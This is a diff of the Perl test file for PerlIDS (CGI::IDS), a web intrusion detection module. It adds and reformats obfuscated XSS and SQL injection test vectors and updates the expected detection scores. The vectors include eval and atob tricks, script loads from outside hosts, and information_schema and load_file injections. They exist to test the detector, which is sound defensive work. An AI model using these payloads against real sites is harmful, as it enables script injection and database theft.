@@ -3,7 +3,7 @@
 #   01_ids.t
 # DESCRIPTION
 #   Tests for PerlIDS (CGI::IDS)
-#   The vector tests are based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1374
+#   The vector tests are based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1409
 # AUTHOR
 #   Hinnerk Altenburg <hinnerk@cpan.org>
 # CREATION DATE
@@ -336,6 +336,28 @@ my %testConcatenatedXSSList2 = (
         31 => 'location.assign(1?name+1:(x))',
         32 => "this[('eva')+new Array + 'l'](/x.x.x/+name+/x.x/)",
         33 => "this[[],('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)",
+        34 => 'alal=(/YWxlcnQ/)(/YWxlcnQ/),
+                        alal=alal[0],
+                        atyujg=(/atob/)(/atob/),
+                        con=atyujg.concat,
+                        con1=con()[0],
+                        con=con1[atyujg],
+                        alal=con(alal),
+                        alal=con1[alal],
+                        alal(1)',
+        35 => 'alal=(1,/YWxlcnQ/),
+                        alal=alal(alal),
+                        alal=alal[0],
+                        atyujg=(1,/atob/),
+                        atyujg=atyujg(atyujg),
+                        atat=atyujg[0],
+                        con=atyujg.concat,
+                        con1=con(),
+                        con1=con1[0],
+                        con=con1[atat],
+                        alal=con(alal),
+                        alal=con1[alal],
+                        alal(1)',
 );
 
 my %testXMLPredicateXSSList = (
@@ -358,83 +380,84 @@ my %testConditionalCompilationXSSList = (
 );
 
 my %testXSSList = (
-	0   => '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00',
-	1   => '"></a style="xss:ex/**/pression(alert(1));"',
-	2   => 'top.__proto__._= alert
-               _(1)',
-	3   => 'document.__parent__._=alert
-              _(1)',
-	4   => 'alert(1)',
-	5	=> "b=/a/,
-                d=alert
-                d(",
-	6  => "1
-                alert(1)",
-	7  => "crypto [ [ 'aler' , 't' ] [ 'join' ] ( [] ) ] (1) ",
-	8  => '<div/style=\-\mo\z\-b\i'."\n".'d\in\g:\url(//business\i'."\n".'fo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>',
-	9  => "_content/alert(1)",
-	10  => "RegExp(/a/,alert(1))",
-	11  => "x=[/&/,alert,/&/][1],x(1)",
-	12  => "[1,alert,1][1](1)",
-	13  => "throw alert(1)",
-	14  => "delete alert(1)",
-	15  => "\$=.7.eval,\$(//
-                name
-                ,1)",
-	16  => "\$=.7.eval,\$(\$('\rname'),1)",
-	17  => "e=1..eval
-                        e(e(\"\u200fname\"),e)",
-	18  => "<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>",
-	19  => "a//a'\u000aeval(name)",
-	20  => "a//a';eval(name)",
-	21  => "(x) setter=0?0.:alert,x=0",
-	22  => "y=('na') + new Array +'me'
-                y
-                (x)getter=0?0+0:eval,x=y
-                'foo bar foo bar f'",
-	23  => "'foo bar foo bar foo bar foo bar foo bar foo bar foo bar foo'
-                y\$=('na') +new Array+'me'
-                x\$=('ev') +new Array+'al'
-                x\$=0[x\$]
-                x\$(x\$(y\$)+y\$)",
-	24  => "<applet/src=http://businessinfo.co.uk/labs/xss.html
-                type=text/html>",
-	25  => "onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert",
-	26  => 'onload=1&&alert',
-	27  => "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')",
-	28  => 'document.body.style.cssText=name',
-	29  => "for(i=0;;)i",
-	30  => "stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)",
-	31  => "this .fdgsdfgsdfgdsfgdsfg
+        0   => '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00',
+        1   => '"></a style="xss:ex/**/pression(alert(1));"',
+        2   => 'top.__proto__._= alert
+                   _(1)',
+        3   => 'document.__parent__._=alert
+                  _(1)',
+        4   => 'alert(1)',
+        5	=> "b=/a/,
+                    d=alert
+                    d(",
+        6  => "1
+                    alert(1)",
+        7  => "crypto [ [ 'aler' , 't' ] [ 'join' ] ( [] ) ] (1) ",
+        8  => '<div/style=\-\mo\z\-b\i'."\n".'d\in\g:\url(//business\i'."\n".'fo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>',
+        9  => "_content/alert(1)",
+        10  => "RegExp(/a/,alert(1))",
+        11  => "x=[/&/,alert,/&/][1],x(1)",
+        12  => "[1,alert,1][1](1)",
+        13  => "throw alert(1)",
+        14  => "delete alert(1)",
+        15  => "\$=.7.eval,\$(//
+                    name
+                    ,1)",
+        16  => "\$=.7.eval,\$(\$('\rname'),1)",
+        17  => "e=1..eval
+                            e(e(\"\u200fname\"),e)",
+        18  => "<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>",
+        19  => "a//a'\u000aeval(name)",
+        20  => "a//a';eval(name)",
+        21  => "(x) setter=0?0.:alert,x=0",
+        22  => "y=('na') + new Array +'me'
+                    y
+                    (x)getter=0?0+0:eval,x=y
+                    'foo bar foo bar f'",
+        23  => "'foo bar foo bar foo bar foo bar foo bar foo bar foo bar foo'
+                    y\$=('na') +new Array+'me'
+                    x\$=('ev') +new Array+'al'
+                    x\$=0[x\$]
+                    x\$(x\$(y\$)+y\$)",
+        24  => "<applet/src=http://businessinfo.co.uk/labs/xss.html
+                    type=text/html>",
+        25  => "onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert",
+        26  => 'onload=1&&alert',
+        27  => "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')",
+        28  => 'document.body.style.cssText=name',
+        29  => "for(i=0;;)i",
+        30  => "stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)",
+        31  => "this .fdgsdfgsdfgdsfgdsfg
                         this .fdgsdfgsdfgdsfgdsfg
                         this .fdgsdfgsdfgdsfgdsfg
                         this .fdgsdfgsdfgdsfgdsfg
                         this .fdgsdfgsdfgdsfgdsfg
                         aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo",
-	32  => "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)",
-	33  => '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>',
-	34  => "const urchinTracker = open",
-	35  => "-setTimeout(
-						1E1+
-						',aler\
-						t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )",
-	36 => '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>',
-	37 => '$$=\'e\'
-						_=$$+\'val\'
-						$=_
-						x=this[$]
-						y=x(\'nam\' + $$)
-						x(y)
-						\'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'',
-	38 => '‹img/src=x""onerror=alert(1)///›',
-	39 => 'Image() .
-						ownerDocument .x=1',
-	40 => CGI::IDS::urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//'),
-	41 => "',jQuery(\"body\").html(//);\'a'",
-	42 => '\',$(fred).set(\'html\',\'magically changes\')
-						\'s',
-	43 => "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
-						's",
+        32  => "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)",
+        33  => '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>',
+        34  => "const urchinTracker = open",
+        35  => "-setTimeout(
+                        1E1+
+                        ',aler\
+                        t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )",
+        36 => '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>',
+        37 => '$$=\'e\'
+                        _=$$+\'val\'
+                        $=_
+                        x=this[$]
+                        y=x(\'nam\' + $$)
+                        x(y)
+                        \'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'',
+        38 => '‹img/src=x""onerror=alert(1)///›',
+        39 => 'Image() .
+                            ownerDocument .x=1',
+        40 => CGI::IDS::urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//'),
+        41 => "',jQuery(\"body\").html(//);\'a'",
+        42 => '\',$(fred).set(\'html\',\'magically changes\')
+                        \'s',
+        43 => "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
+                        's",
+        42 => 'lo=/,Batman/,alert(\'Batman flew here\')',
 );
 
 my %testSelfContainedXSSList = (
@@ -466,7 +489,7 @@ my %testSelfContainedXSSList = (
 	                        ",
 	15 => '-parent(1)',
 	16 => "//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf
-						(new Option)['innerHTML']=opener.name",
+                        (new Option)['innerHTML']=opener.name",
 );
 
 my %testSQLIList = (
@@ -637,6 +660,7 @@ my %testSQLIList4 = (
 	43  =>  "aa' *\@var or 1 RLIKE (1)|'1 ",
 	44  =>  "a' or~column like ~1|'1",
 	45  =>  "'<~'",
+	46  =>  "a'-1.and '1",
 	);
 
 my %testSQLIList5 = (
@@ -743,6 +767,8 @@ my %testSQLIList6 = (
 	28 => "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1",
 	29 => "null''null' find_in_set(uname, 'lightos' ) and '1",
 	30 => "(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ",
+	31 => CGI::IDS::urldecode('%27sounds%20like%281%29%20union%19%28select%191,group_concat%28table_name%29,3%19from%19information_schema.%60tables%60%29%23%28'),
+	32 => "0' '1' like (0) and 1 sounds like a or true#1",
 );
 
 my %testDTList = (
@@ -1024,26 +1050,26 @@ is ($ids->detect_attacks(request => \%testWhitelistSkip3),					8,			"testWhiteli
 print testmessage("test converters and filters");
 is ($ids->detect_attacks(request => \%testAttributeBreakerList),			29,			"testAttributeBreakerList");
 is ($ids->detect_attacks(request => \%testCommentList),						9,			"testCommentList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1125,		"testConcatenatedXSSList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			935,		"testConcatenatedXSSList2");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1126,		"testConcatenatedXSSList");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			1047,		"testConcatenatedXSSList2");
 is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				148,		"testXMLPredicateXSSList");
 is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),	87,			"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testXSSList),							750,		"testXSSList");
-is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			526,		"testSelfContainedXSSList");
-is ($ids->detect_attacks(request => \%testSQLIList),						475,		"testSQLIList");
-is ($ids->detect_attacks(request => \%testSQLIList2),						649,		"testSQLIList2");
+is ($ids->detect_attacks(request => \%testXSSList),							784,		"testXSSList");
+is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			530,		"testSelfContainedXSSList");
+is ($ids->detect_attacks(request => \%testSQLIList),						464,		"testSQLIList");
+is ($ids->detect_attacks(request => \%testSQLIList2),						634,		"testSQLIList2");
 is ($ids->detect_attacks(request => \%testSQLIList3),						591,		"testSQLIList3");
-is ($ids->detect_attacks(request => \%testSQLIList4),						852,		"testSQLIList4");
-is ($ids->detect_attacks(request => \%testSQLIList5),						935,		"testSQLIList5");
-is ($ids->detect_attacks(request => \%testSQLIList6),						469,		"testSQLIList6");
+is ($ids->detect_attacks(request => \%testSQLIList4),						853,		"testSQLIList4");
+is ($ids->detect_attacks(request => \%testSQLIList5),						928,		"testSQLIList5");
+is ($ids->detect_attacks(request => \%testSQLIList6),						546,		"testSQLIList6");
 is ($ids->detect_attacks(request => \%testDTList),							126,		"testDTList");
 is ($ids->detect_attacks(request => \%testURIList),							143,		"testURIList");
 is ($ids->detect_attacks(request => \%testRFEList),							524,		"testRFEList");
 is ($ids->detect_attacks(request => \%testUTF7List),						71,			"testUTF7List");
-is ($ids->detect_attacks(request => \%testBase64CCConverter),				95,			"testBase64CCConverter");
+is ($ids->detect_attacks(request => \%testBase64CCConverter),				151,		"testBase64CCConverter");
 is ($ids->detect_attacks(request => \%testDecimalCCConverter),				72,			"testDecimalCCConverter");
 is ($ids->detect_attacks(request => \%testOctalCCConverter),				48,			"testOctalCCConverter");
-is ($ids->detect_attacks(request => \%testHexCCConverter),					99,	    	"testHexCCConverter");
+is ($ids->detect_attacks(request => \%testHexCCConverter),					109,    	"testHexCCConverter");
 is ($ids->detect_attacks(request => \%testLDAPInjectionList),				20,			"testLDAPInjectionList");
 is ($ids->detect_attacks(request => \%testJSONScanning),					32,			"testJSONScanning");
 is ($ids->detect_attacks(request => \%testForFalseAlerts),					0,			"testForFalseAlerts");
